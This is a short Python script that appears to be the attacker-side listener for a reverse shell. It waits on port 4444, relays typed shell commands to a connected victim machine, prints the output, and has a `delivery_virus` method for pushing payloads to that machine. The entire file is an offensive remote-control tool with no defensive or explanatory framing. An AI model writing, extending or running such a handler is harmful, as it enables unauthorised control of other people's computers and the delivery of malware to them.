import socket, time
import socketserver

class tunnel:
    
    def __init__(self, lhost="0.0.0.0", lport=4444):
        self.sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.sock.bind((lhost,lport))
        self.sock.listen(5)
        print("listening on port {}".format(lport))
        self.conn, self.addr = self.sock.accept()
        self.conn.settimeout(1.0)
        print("connection from: {}",self.addr)
        
    def get_conn(self):
        return self.conn
    
    def sent_command(self, command):
        self.conn.send(command)
        time.sleep(1)
        
    def get_response(self):
        return self.conn.recv(1024).decode()
    
    def delivery_virus(self, virus):
        self.conn.sendall(virus)
        

c = tunnel()

while True:
    try:
        command = input("$ ").encode()
        if command == b"exit":
            break
        command+=b"\n"
        c.sent_command(command)
        print(c.get_response())
    except TimeoutError as t:
        print("no Response")
        